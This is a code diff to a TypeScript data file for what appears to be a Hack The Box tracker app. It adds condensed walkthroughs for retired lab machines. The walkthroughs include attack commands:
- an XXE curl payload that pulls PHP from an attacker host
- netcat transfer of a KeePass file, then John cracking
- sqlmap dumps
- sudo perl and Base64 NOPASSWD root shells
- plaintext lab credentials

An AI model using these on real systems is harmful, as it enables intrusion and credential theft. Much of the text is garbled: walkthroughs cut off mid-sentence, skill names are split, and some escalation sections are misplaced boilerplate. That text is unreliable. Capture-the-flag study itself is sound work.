@@ -10051,15 +12424,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Exploiting-NOPASSWD",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fluxcapacitor",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fluxcapacitor",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "FluxCapacitor focuses on intermediate/advanced",
     "timeSpentSeconds": 0,
     "createdAt": "2017-12-16T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "FluxCapacitor focuses on intermediate/advanced",
+    "skillsLearned": [
+      "Enumerating HTTP parameters",
+      "Bypassing basic WAF rules",
+      "Exploiting NOPASSWD"
+    ],
+    "officialPdf": "119-FluxCapacitor_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFluxCapacitor focuses on intermediate/advanced\n\n### 🎯 Core Skills\n- **Enumerating HTTP parameters**\n- **Bypassing basic WAF rules**\n- **Exploiting NOPASSWD**\n\n### ⚔️ Foothold Vector\nAttempting to curl the /sync endpoint will result in a timestamp being returned. A bit of testing reveals that any user-agent containing \"Mozilla\" will return a 403 error. Wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter- names.txt Using the above wordlist, it is possible to fuzz and find a parameter name for the /sync endpoint. With wfuzz, the syntax is wfuzz -c -z file,burp-parameter-names.txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup The parameter opt is the only result with a 403 error.\n\n### 👑 Privilege Escalation\nEscalating privileges if fairly straightforward. Simply running sudo -l exposes a NOPASSWD script at /home/themiddle/.monit. Reviewing the script, it appears that the first argument must be cmd, followed by a second argument which is a Base64-encoded command that will be executed. For example, running the command sudo /home/themiddle/.monit cmd d2hvYW1p will execute whoami and output root."
   },
   {
     "id": "htb-bashed",
@@ -10075,7 +12457,7 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bashed",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bashed",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted,",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-12-09T17:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10084,7 +12466,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted,",
+    "skillsLearned": [
+      "Basic web fuzzing techniques",
+      "Locating recently modified files"
+    ],
+    "officialPdf": "118-Bashed_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted,\n\n### 🎯 Core Skills\n- **Basic web fuzzing techniques**\n- **Locating recently modified files**\n\n### ⚔️ Foothold Vector\nphpbash Using phpbash to gain a full shell is trivial. Simply using one of many connect-back commands or using phpbash to grab a Meterpreter stager will grant access as the www-data user.\n\n### 👑 Privilege Escalation\nExploring directories on the target quickly reveals /scripts, which is owned by the scriptmanager user. The command sudo -l reveals that the www-data user can run any command as scriptmanager. Running the command sudo -u scriptmanager bash -i will spawn a bash shell and give full read/write access to /scripts Looking at the information of the files in the directory shows that test.py appears to be executed every minute. This can be inferred by reading test.py and looking at the timestamp of test.txt. The text file is owned by root, so it can also be assumed that it is run as a root cron job. A root shell can be obtained simply by modifying test."
   },
   {
     "id": "htb-inception",
@@ -10095,15 +12484,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Advanced-local",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/inception",
     "writeupUrl": "https://0xdf.gitlab.io/tags#inception",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Inception is a fairly challenging box and is one of the few machines that requires pivoting to advance. There are many different steps and techniques needed to successfully achieve root access on the main host operating system.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-12-02T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Inception is a fairly challenging box and is one of the few machines that requires pivoting to advance. There are many different steps and techniques needed to successfully achieve root access on the main host operating system. Good",
+    "skillsLearned": [
+      "Identifying vulnerable services",
+      "Bypassing restrictive network filtering",
+      "Advanced local"
+    ],
+    "officialPdf": "117-Inception_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nInception is a fairly challenging box and is one of the few machines that requires pivoting to advance. There are many different steps and techniques needed to successfully achieve root access on the main host operating system. Good\n\n### 🎯 Core Skills\n- **Identifying vulnerable services**\n- **Bypassing restrictive network filtering**\n- **Advanced local**\n\n### ⚔️ Foothold Vector\ndompdf Inspecting the source of the default website on port 80 reveals a reference to dompdf. Browsing to /dompdf reveals a copy of dompdf that is vulnerable to local file inclusion (v0.6.0). The version can be easily identified by viewing the VERSION file.\n\n### 👑 Privilege Escalation\naccess on the main host operating system. Good enumeration skills are an asset when attempting this machine. Skills Required ● Advanced knowledge of Linux ● Understanding of various pivot techniques Skills Learned ● Identifying vulnerable services ● Bypassing restrictive network filtering ● Advanced local enumeration techniques ● Enumerating services using a pivot machine"
   },
   {
     "id": "htb-fulcrum",
@@ -10114,15 +12512,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Advanced-remote",
+      "HTB",
+      "network-rules"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fulcrum",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fulcrum",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Fulcrum is one of the most challenging machines on Hack The Box. It requires multiple pivots between Linux and Windows, and focuses heavily on the use of PowerShell.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-11-25T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Fulcrum is one of the most challenging machines on Hack The Box. It requires multiple pivots between Linux and Windows, and focuses heavily on the use of PowerShell.",
+    "skillsLearned": [
+      "Exploiting XML external entities",
+      "Exploiting file inclusion vulnerabilities",
+      "Chaining exploits to increase impact",
+      "Bypassing restrictive outbound",
+      "network rules",
+      "Advanced remote"
+    ],
+    "officialPdf": "116-Fulcrum_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFulcrum is one of the most challenging machines on Hack The Box. It requires multiple pivots between Linux and Windows, and focuses heavily on the use of PowerShell.\n\n### 🎯 Core Skills\n- **Exploiting XML external entities**\n- **Exploiting file inclusion vulnerabilities**\n- **Chaining exploits to increase impact**\n- **Bypassing restrictive outbound**\n- **network rules**\n- **Advanced remote**\n\n### ⚔️ Foothold Vector\nXXE & File Inclusion On port 56423 there is a basic ping/pong JSON response. By sending a POST request containing XML to the endpoint, it is possible to force the server to include an external entity. On its own this is not enough to gain a shell, however it can be successfully chained with a file inclusion vulnerability on port 4. The following command will cause the server to include a writeup.php file hosted on the attacking machine. Command: curl 10.10.10.62:56423 -X POST -d '<?xml version=\"1.0\" encoding=\"UTF-8\" ?><!DOCTYPE writeup [<!ENTITY xxe SYSTEM \"http://127.0.0.1:4/index.php?page=http://10.10.14.10/writeup\" >]><foo>&xxe;</foo>'\n\n### 👑 Privilege Escalation\nWinRM Looking at ifconfig shows a virbr0 interface with the address range 192.168.122.1/24. The target IP (192.168.122.228) can be enumerated by running a port scan against the network, and it is also referenced in one of nginx's sites-available config files. Some credentials can be retrieved from the Fulcrum_Upload_to_Corp.ps1 file. Simply running the script and appending $5.GetNetworkCredential().Username and $5.GetNetworkCredential().Password will print the plaintext credentials. By dropping a static socat binary on the target, it is possible to create a basic proxy and forward data directly from the attacking machine to WinRM on the target."
   },
   {
     "id": "htb-ariekei",
@@ -10133,15 +12544,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2016-3714",
+      "HTB",
+      "Identifying-containers",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ariekei",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ariekei",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Ariekei is a complex machine focusing mainly on web application firewalls and pivoting techniques. This machine is by far one of the most challenging, requiring multiple escalations and container breakouts.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-11-18T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ariekei is a complex machine focusing mainly on web application firewalls and pivoting techniques. This machine is by far one of the most challenging, requiring multiple escalations and container breakouts.",
+    "skillsLearned": [
+      "Identifying containers",
+      "Enumerating remote networks",
+      "Advanced pivoting and tunneling",
+      "techniques",
+      "Web application firewall evasion"
+    ],
+    "officialPdf": "115-Ariekei_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAriekei is a complex machine focusing mainly on web application firewalls and pivoting techniques. This machine is by far one of the most challenging, requiring multiple escalations and container breakouts.\n\n### 🎯 Core Skills\n- **Identifying containers**\n- **Enumerating remote networks**\n- **Advanced pivoting and tunneling**\n- **techniques**\n- **Web application firewall evasion**\n\n### 🛡️ Associated CVEs\n`CVE-2016-3714`\n\n### ⚔️ Foothold Vector\nImageTragick Exploit: https://imagetragick.com Using the ImageTragick exploit (CVE-2016-3714) is trivial. Uploading an .mvg file with the following content will grant a shell as the first\n\n### 👑 Privilege Escalation\nuser. As root access is gained immediately, and many default binaries are missing from the machine, it can be assumed that the connection is restricted to a container of some kind."
   },
   {
     "id": "htb-jeeves",
@@ -10152,15 +12576,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Defender",
+      "HTB",
+      "Pass",
+      "hash-attacks"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/jeeves",
     "writeupUrl": "https://0xdf.gitlab.io/tags#jeeves",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-11-11T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.",
+    "skillsLearned": [
+      "Obtaining shell through Jenkins",
+      "Techniques for bypassing Windows",
+      "Defender",
+      "Pass",
+      "hash attacks",
+      "Enumerating alternate data streams"
+    ],
+    "officialPdf": "114-Jeeves_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nJeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.\n\n### 🎯 Core Skills\n- **Obtaining shell through Jenkins**\n- **Techniques for bypassing Windows**\n- **Defender**\n- **Pass**\n- **hash attacks**\n- **Enumerating alternate data streams**\n\n### ⚔️ Foothold Vector\nJenkins Netcat for Windows: https://eternallybored.org/misc/netcat/ Using Jenkins to acquire a shell is fairly straightforward, however there is an antivirus running on the target which prevents most Metasploit-based payloads from running. An easy workaround for this is to upload a copy of Netcat for Windows and use it to connect back. Code execution is trivial with Jenkins. Simply creating a new item and adding a build step (Execute Windows batch command) is all that is required. Jenkins will execute each line in order when the project is built. Receiving the connection with nc -nvlp 1234 grants access as the kohsuke user. A bit of browsing quickly reveals a CEH.\n\n### 👑 Privilege Escalation\nKeePass Database Cracking the KeePass database password is fairly simple. The kdbx file can be transferred to the attacking machine using Netcat. The command nc -lp 1235 > jeeves.kdbx will listen for data on the attacking machine and pipe it to a file. Running the command nc.exe -w 3 <LAB IP> 1235 < CEH.kdbx on the target will complete the transfer. With the database at hand, cracking is as easy as extracting the hash with keepass2john jeeves.kdbx > jeeves.hash and running John with john jeeves.hash Once the database is open, several passwords are accessible, however only the Backup stuff entry is important."
   },
   {
     "id": "htb-tally",
@@ -10171,15 +12609,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Enumerating-Sharepoint",
+      "Exploit-modification",
+      "Exploiting-MSSQL",
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/tally",
     "writeupUrl": "https://0xdf.gitlab.io/tags#tally",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Tally can be a very challenging machine for some. It focuses on many different aspects of real Windows environments and requires users to modify and compile an exploit for escalation.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-11-04T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Tally can be a very challenging machine for some. It focuses on many different aspects of real Windows environments and requires users to modify and compile an exploit for escalation. Not covered in this document is the use of Rotten Potato, which is an unintended alternate method for privilege escalation.",
+    "skillsLearned": [
+      "Enumerating Sharepoint",
+      "Exploiting MSSQL",
+      "Windows Defender/AV evasion",
+      "techniques",
+      "Exploit modification"
+    ],
+    "officialPdf": "113-Tally_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTally can be a very challenging machine for some. It focuses on many different aspects of real Windows environments and requires users to modify and compile an exploit for escalation. Not covered in this document is the use of Rotten Potato, which is an unintended alternate method for privilege escalation.\n\n### 🎯 Core Skills\n- **Enumerating Sharepoint**\n- **Exploiting MSSQL**\n- **Windows Defender/AV evasion**\n- **techniques**\n- **Exploit modification**\n\n### ⚔️ Foothold Vector\nFTP Using the credentials gained during Sharepoint enumeration (ftp_user:UTDRSCH53c\"$6hys), it is possible to connect via FTP. A bit of searching finds a do to.txt file in /User/Tim/Project/Log which references a KeePass file and a migration folder. The KeePass database can be found at /User/Tim/Files/tim.kdbx. Note that binary mode must be enabled once connected to FTP (via the binary command) to transfer the file properly. Cracking the KeePass password with John is trivial, and is fairly quick using rockyou.txt.\n\n### 👑 Privilege Escalation\n. Skills Required ● Intermediate/advanced knowledge of Windows ● Basic understanding of C and compiler flags Skills Learned ● Enumerating Sharepoint ● Exploiting MSSQL ● Windows Defender/AV evasion techniques ● Exploit modification"
   },
   {
     "id": "htb-enterprise",
@@ -10195,10 +12647,18 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/enterprise",
     "writeupUrl": "https://0xdf.gitlab.io/tags#enterprise",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Enterprise is one of the more challenging machines on Hack The Box. It requires a wide range of knowledge and skills to successfully exploit.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-10-28T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Enterprise is one of the more challenging machines on Hack The Box. It requires a wide range of knowledge and skills to successfully exploit. It features a custom wordpress plugin and a buffer overflow vulnerability that can be exploited both locally and remotely.",
+    "skillsLearned": [
+      "Identifying Docker instances",
+      "Exploiting Wordpress plugins",
+      "Exploiting buffer overflows"
+    ],
+    "officialPdf": "112-Enterprise_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nEnterprise is one of the more challenging machines on Hack The Box. It requires a wide range of knowledge and skills to successfully exploit. It features a custom wordpress plugin and a buffer overflow vulnerability that can be exploited both locally and remotely.\n\n### 🎯 Core Skills\n- **Identifying Docker instances**\n- **Exploiting Wordpress plugins**\n- **Exploiting buffer overflows**\n\n### ⚔️ Foothold Vector\nSQLMap Once the lcars plugin is located, SQLMap can be run against it to dump the database and get some useful information from an unpublished post with the command sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --threads 10 -D wordpress -T wp_posts -C post_content --dump The post contains valid login credentials, and the combination william.riker:u*Z14ru0p#ttj83zS6 grants access to the Wordpress administrator panel, however any attempts to gain a shell will reveal that Wordpress is run in a Docker container. Dumping the Joomla user list and attempting to reuse some of the passwords found on Wordpress will grant access to the Joomla administrator panel.\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum reveals a lot of information about the system. An SUID binary exists at /bin/lcars. Attempting to run the file requires an access code, which can be obtained by running ltrace /bin/lcars. Playing around with the options reveals that 4 (Security) has a buffer overflow, which can be exploited to gain root access. The payload is fairly simple to generate, however the environment variables can cause a bit of confusion as it changes the addresses. To avoid that, run gdb with env - gdb /bin/lcars and pass the payload with cat payload.txt | env - /bin/lcars. Also run unset env LINES and unset env COLUMNS in both terminal and gdb."
   },
   {
     "id": "htb-sense",
@@ -10209,15 +12669,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Exploiting-PFSense",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sense",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sense",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-10-21T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.",
+    "skillsLearned": [
+      "Modifying publicly available exploits",
+      "Bypassing strict filtering",
+      "Exploiting PFSense"
+    ],
+    "officialPdf": "111-Sense_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.\n\n### 🎯 Core Skills\n- **Modifying publicly available exploits**\n- **Bypassing strict filtering**\n- **Exploiting PFSense**\n\n### ⚔️ Foothold Vector\nExploit: https://www.exploit-db.com/exploits/39709/ At first, exploitation seems fairly straightforward. However after a few attempts, it is clear the above proof of concept is not stable on this machine. Rather than using octals, it is possible to Base64-encode some PHP to obtain a reverse shell. Note that many URL encoding tools do not encode parenthesis and ampersands, which is required for this exploit to work. To start out, log in as the rohit user and browse to Status > RRD Graphs, using Burp Suite to intercept the request to status_rrd_graph_img.php. The above request will create a writeup.php file on the target in the"
   },
   {
     "id": "htb-node",
@@ -10228,15 +12697,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Bypassing-ASLR-and-NX",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/node",
     "writeupUrl": "https://0xdf.gitlab.io/tags#node",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Node focuses mainly on newer software and poor configurations. The machine starts out seemingly easy, but gets progressively harder as more access is gained.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-10-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Node focuses mainly on newer software and poor configurations. The machine starts out seemingly easy, but gets progressively harder as more access is gained. In-depth",
+    "skillsLearned": [
+      "Bypassing user agent filtering",
+      "Brute forcing JSON payloads",
+      "Exploiting buffer overflows",
+      "Bypassing ASLR and NX"
+    ],
+    "officialPdf": "110-Node_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNode focuses mainly on newer software and poor configurations. The machine starts out seemingly easy, but gets progressively harder as more access is gained. In-depth\n\n### 🎯 Core Skills\n- **Bypassing user agent filtering**\n- **Brute forcing JSON payloads**\n- **Exploiting buffer overflows**\n- **Bypassing ASLR and NX**\n\n### ⚔️ Foothold Vector\nWebsite While two accounts linked to from the home page can be brute forced, they are unprivileged and do not aid with exploitation. Examining the source code for the home page reveals several javascript files. The file app.js references the file /partials/admin.html which allows for download of a backup with valid administrator permissions. Intercepting requests to the profile page with Burp Suite (or simply reviewing all javascript files in detail) reveals a user API at /api/users/<username>. Attempting to browse to /api/users/ exposes a list of all valid usernames as well as their hashes. With a valid administrator username, it is now possible to brute force to gain access.\n\n### 👑 Privilege Escalation\nTom LinEnum: https://github.com/rebootuser/LinEnum Running LinEnum (or simply ps aux in this case) reveals a service running under the tom user, which was created by the command /usr/bin/node /var/scheduler/app.js. Reviewing app.js reveals that the credentials found previously are reused to connect to a MongoDB database named scheduler. Using the command mongo -p -u mark scheduler will grant command line access to MongoDB. The following command will create a copy of bash and set SGID, and it will be owned by tom. db.tasks."
   },
   {
     "id": "htb-minion",
@@ -10247,15 +12726,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Forgery",
+      "HTB",
+      "streams"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/minion",
     "writeupUrl": "https://0xdf.gitlab.io/tags#minion",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Minion is quite a challenging machine, and requires fairly advanced knowledge of Windows and PowerShell to complete. This machine touches on many different topics and can be a great learning experience.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-10-07T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Minion is quite a challenging machine, and requires fairly advanced knowledge of Windows and PowerShell to complete. This machine touches on many different topics and can be a great learning experience.",
+    "skillsLearned": [
+      "Exploiting Server Side Request",
+      "Forgery",
+      "Exploiting blind command injection",
+      "Finding and reading alternate data",
+      "streams"
+    ],
+    "officialPdf": "109-Minion_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMinion is quite a challenging machine, and requires fairly advanced knowledge of Windows and PowerShell to complete. This machine touches on many different topics and can be a great learning experience.\n\n### 🎯 Core Skills\n- **Exploiting Server Side Request**\n- **Forgery**\n- **Exploiting blind command injection**\n- **Finding and reading alternate data**\n- **streams**\n\n### ⚔️ Foothold Vector\nServer Side Request Forgery Reverse ICMP Shell: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1 ICMP Listener: https://github.com/inquisb/icmpsh The test.asp file accepts a u parameter, which will load the specified URL. It is also vulnerable to server side request forgery, and fuzzing 127.0.0.1 reveals a cmd.aspx file, which executes a command specified in the xcmd parameter. http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=dir When executing a command, only the exit code is displayed on the page It is possible to create a PowerShell script on the target using a simple bash script.\n\n### 👑 Privilege Escalation\nUser (decoder) There is a non-default folder, sysadmscripts, which can be found in the root of the drive. In the directory is a del_logs.bat file. A bit of searching reveals that it is run as a scheduled task every 5 minutes. Reviewing the source of del_logs.bat shows that it executes the c.ps1 script in the same directory. Checking the permissions of c.ps1 reveal that it is world-writeable. Modifying the previous exploit slightly allows for overwriting of the c.ps1 file, which will then be executed by the scheduled task and open a reverse ICMP shell as the decoder user. The user flag can be obtained from C:\\Users\\decoder.MINION\\Desktop\\user.txt"
   },
   {
     "id": "htb-shocker",
@@ -10266,12 +12757,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "Exploiting-NOPASSWD",
+      "Exploiting-shellshock",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/shocker",
     "writeupUrl": "https://0xdf.gitlab.io/tags#shocker",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.",
     "timeSpentSeconds": 3600,
     "createdAt": "2017-09-30T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10280,7 +12773,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.",
+    "skillsLearned": [
+      "Exploiting shellshock",
+      "Exploiting NOPASSWD"
+    ],
+    "officialPdf": "108-Shocker_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nShocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.\n\n### 🎯 Core Skills\n- **Exploiting shellshock**\n- **Exploiting NOPASSWD**\n\n### 👑 Privilege Escalation\nLinEnum: https://github.com/rebootuser/LinEnum Running LinEnum presents a large amount of data to go over. One thing that stands out fairly quickly is that there is no password required to execute sudo /usr/bin/perl. Exploitation of this is trivial, and there are many ways from here to obtain the root flag. To quickly gain a root shell, the following command will suffice: sudo /usr/bin/perl -e 'exec \"/bin/sh\"' The root flag can be retrieved from /root/root.txt."
   },
   {
     "id": "htb-kotarak",
@@ -10291,15 +12791,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-Wget",
+      "Exploiting-cron-jobs",
+      "HTB",
+      "containers"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/kotarak",
     "writeupUrl": "https://0xdf.gitlab.io/tags#kotarak",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Kotarak focuses on many different attack vectors and requires quite a few steps for completion. It is a great learning experience as many of the topics are not covered by other machines on Hack The Box.",
     "timeSpentSeconds": 0,
     "createdAt": "2017-09-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Kotarak focuses on many different attack vectors and requires quite a few steps for completion. It is a great learning experience as many of the topics are not covered by other machines on Hack The Box.",
+    "skillsLearned": [
+      "Exploiting server side request forgery",
+      "Extracting data from NTDS dumps",
+      "Exploiting Wget",
+      "Exploiting cron jobs",
+      "Identifying isolated systems and",
+      "containers"
+    ],
+    "officialPdf": "101-Kotarak_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nKotarak focuses on many different attack vectors and requires quite a few steps for completion. It is a great learning experience as many of the topics are not covered by other machines on Hack The Box.\n\n### 🎯 Core Skills\n- **Exploiting server side request forgery**\n- **Extracting data from NTDS dumps**\n- **Exploiting Wget**\n- **Exploiting cron jobs**\n- **Identifying isolated systems and**\n- **containers**\n\n### ⚔️ Foothold Vector\nSSRF While there are quite a few vulnerabilities and attack vectors available for Tomcat, none appear to be successful in this context. Looking at the web server on port 60000 reveals a rudimentary proxy, which happens to be vulnerable to server side request forgery. By fuzzing the URL http://10.10.10.55:6000/url.php?path=127.0.0.1:FUZZ it is possible to access several localhost-only services. Browsing to 127.0.0.1:888 reveals a directory listing. Viewing the source for http://10.10.10.55:60000/url.php?path=127.0.0.1:888?doc=backup reveals valid login credentials for the Tomcat server, which can be accessed at http://10.10.10.55:8080/manager/html\n\n### 👑 Privilege Escalation\nUser (atanas) libesedb: https://github.com/libyal/libesedb ntdsextract: https://github.com/csababarta/ntdsxtract There are several files in /home/tomcat/to_archive/pentest_data that appear to contain NTDS data that was extracted during a pentest. Using libesedb and ntdsextract, it is possible to dump the user hashes, which are conveniently easy to crack and also work on the target. The command esedbexport -m tables 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit will dump the tables. Once that is complete, running dsusers.py from ntdsextract will extract the hashes. dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive kotarak."
   },
   {
     "id": "htb-mantis",
@@ -10310,15 +12824,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Kerberos",
+      "databases"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/mantis",
     "writeupUrl": "https://0xdf.gitlab.io/tags#mantis",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
